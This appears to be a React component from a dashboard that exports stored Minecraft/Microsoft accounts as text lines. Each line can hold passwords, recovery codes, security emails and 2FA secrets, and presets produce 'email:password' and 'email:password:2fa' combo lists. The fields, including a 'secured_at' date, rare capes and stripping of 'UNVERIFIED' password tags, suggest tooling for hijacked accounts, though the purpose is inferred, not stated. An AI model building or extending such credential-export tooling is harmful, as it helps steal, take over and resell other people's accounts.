import { useState, useRef } from "react";
import { Download, X } from "lucide-react";
import type { Account } from "./Accounts";

const PREVIEW = {
  username: "Notch",
  email: "notch@mail.com",
  security_email: "notch@protonmail.com",
  password: "hunter2",
  recovery: "ABCD-EFGH-IJKL-MNOP",
  auth_secret: "JBSWY3DPEHPK3PXP",
  capes: "Migrator, Founder",
  created_at: "2024-01-15",
  id: "1337",
};

const TOKENS = [
  "{username}", "{email}", "{security_email}", "{password}",
  "{recovery}", "{auth_secret}", "{capes}", "{created_at}", "{id}",
];

const PRESETS = [
  { label: "email:password",     template: "{email}:{password}" },
  { label: "user:password",      template: "{username}:{password}" },
  { label: "email:password:2fa", template: "{email}:{password}:{auth_secret}" },
  { label: "email:recovery",     template: "{email}:{recovery}" },
];

function renderPreview(template: string): string {
  return template.replace(/\{(\w+)\}/g, (_, k) => (PREVIEW as any)[k] ?? `{${k}}`);
}

export function ExportModal({ accounts, onClose }: { accounts: Account[]; onClose: () => void }) {
  const [template, setTemplate] = useState("{username}:{email}:{password}");
  const inputRef = useRef<HTMLTextAreaElement>(null);

  const insertToken = (token: string) => {
    const el = inputRef.current;
    if (!el) return;
    const start = el.selectionStart ?? template.length;
    const end = el.selectionEnd ?? template.length;
    const next = template.slice(0, start) + token + template.slice(end);
    setTemplate(next);
    requestAnimationFrame(() => {
      el.focus();
      el.setSelectionRange(start + token.length, start + token.length);
    });
  };

  const download = () => {
    const lines = accounts.map(a => {
      const map: Record<string, string> = {
        username: a.mc_name ?? a.mc_gamertag ?? "",
        email: a.ms_email ?? "",
        security_email: a.ms_security_email ?? "",
        password: (a.ms_password ?? "").replace(/\s*\(UNVERIFIED[^)]*\)\s*$/i, "").trim(),
        recovery: a.ms_recovery_code ?? "",
        auth_secret: a.ms_auth_secret ?? "",
        capes: a.mc_capes ?? "",
        created_at: a.secured_at?.slice(0, 10) ?? "",
        id: a.account_id ?? "",
      };
      return template.replace(/\{(\w+)\}/g, (_, k) => map[k] ?? `{${k}}`);
    }).join("\n");
    const blob = new Blob([lines], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `accounts_${new Date().toISOString().slice(0, 10)}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/60 backdrop-blur-sm animate-in fade-in duration-200" onClick={onClose}>
      <div className="flex w-[560px] flex-col rounded-2xl border border-border bg-card shadow-2xl backdrop-blur animate-in fade-in zoom-in-95 duration-200" onClick={e => e.stopPropagation()}>
        <div className="h-1 shrink-0 rounded-t-2xl bg-gradient-to-r from-[--primary] to-[--accent]" />

        <div className="flex items-start justify-between gap-4 px-6 pt-5">
          <div className="flex items-start gap-3">
            <div className="grid h-9 w-9 shrink-0 place-items-center rounded-lg bg-[--accent]/15 text-[--accent]">
              <Download className="h-4 w-4" />
            </div>
            <div>
              <h2 className="font-display text-lg font-bold">Export All Accounts</h2>
              <p className="mt-0.5 text-sm text-muted-foreground">Build a custom line format using <code className="rounded bg-muted px-1 text-xs font-mono text-foreground">{"{token}"}</code> placeholders</p>
            </div>
          </div>
          <button onClick={onClose} className="grid h-7 w-7 shrink-0 place-items-center rounded-lg text-muted-foreground transition hover:bg-muted hover:text-foreground">
            <X className="h-4 w-4" />
          </button>
        </div>

        <div className="px-6 pt-5">
          <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Line Template</label>
          <textarea
            ref={inputRef}
            value={template}
            onChange={e => setTemplate(e.target.value)}
            rows={2}
            className="mt-1.5 w-full rounded-lg border border-border bg-background/60 px-3.5 py-2.5 font-mono text-sm outline-none transition focus:border-[--primary] focus:ring-2 focus:ring-[--primary]/30"
          />
        </div>

        <div className="px-6 pt-4">
          <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Insert Token</label>
          <div className="mt-1.5 flex flex-wrap gap-1.5">
            {TOKENS.map(t => (
              <button
                key={t}
                onClick={() => insertToken(t)}
                className="rounded-md border border-border bg-background/40 px-2.5 py-1 font-mono text-[11px] text-muted-foreground transition hover:border-[--accent]/40 hover:bg-[--accent]/10 hover:text-[--accent]"
              >
                {t}
              </button>
            ))}
          </div>
        </div>

        <div className="px-6 pt-4">
          <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Presets</label>
          <div className="mt-1.5 flex flex-wrap gap-2">
            {PRESETS.map(p => (
              <button
                key={p.label}
                onClick={() => setTemplate(p.template)}
                className={`rounded-lg border px-3 py-1.5 text-xs font-medium transition ${
                  template === p.template
                    ? "border-[--primary]/50 bg-[--primary]/15 text-[--primary]"
                    : "border-border bg-background/40 text-muted-foreground hover:border-muted-foreground/40 hover:text-foreground"
                }`}
              >
                {p.label}
              </button>
            ))}
          </div>
        </div>

        <div className="px-6 pt-4 pb-6">
          <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Preview</label>
          <div className="mt-1.5 rounded-lg border-2 border-dashed border-muted-foreground/30 bg-background/30 px-3.5 py-3">
            <code className="text-sm font-mono text-foreground/80">{renderPreview(template)}</code>
          </div>
        </div>

        <div className="flex items-center justify-end gap-3 border-t border-border px-6 py-4">
          <button onClick={onClose} className="rounded-lg border border-border px-4 py-2 text-sm font-medium text-muted-foreground transition hover:bg-muted hover:text-foreground">
            Cancel
          </button>
          <button onClick={download} className="inline-flex items-center gap-2 rounded-lg bg-gradient-to-r from-[--primary] to-[--accent] px-4 py-2 text-sm font-semibold text-primary-foreground shadow-[0_0_20px_-6px_color-mix(in_oklab,var(--primary)_40%,transparent)] transition hover:opacity-95">
            <Download className="h-4 w-4" />
            Download File
          </button>
        </div>
      </div>
    </div>
  );
}
